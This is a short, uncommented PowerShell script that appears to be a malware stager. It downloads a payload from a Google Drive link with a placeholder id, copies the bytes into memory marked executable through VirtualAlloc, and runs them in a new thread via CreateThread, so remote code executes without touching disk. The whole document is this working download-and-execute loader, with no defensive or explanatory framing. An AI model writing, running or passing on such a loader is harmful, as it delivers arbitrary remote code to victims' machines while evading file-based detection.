$url = "https://drive.google.com/uc?export=download&id=XXXX"
$dllBytes = (New-Object Net.WebClient).DownloadData($url)

$UnsafeNativeMethods = @"
using System;
using System.Runtime.InteropServices;
public class UnsafeNativeMethods {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $UnsafeNativeMethods

$buf = $dllBytes
$addr = [UnsafeNativeMethods]::VirtualAlloc(0, $buf.Length, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thread = [UnsafeNativeMethods]::CreateThread(0,0,$addr,0,0,[ref]0)
[UnsafeNativeMethods]::WaitForSingleObject($thread,0xFFFFFFFF)
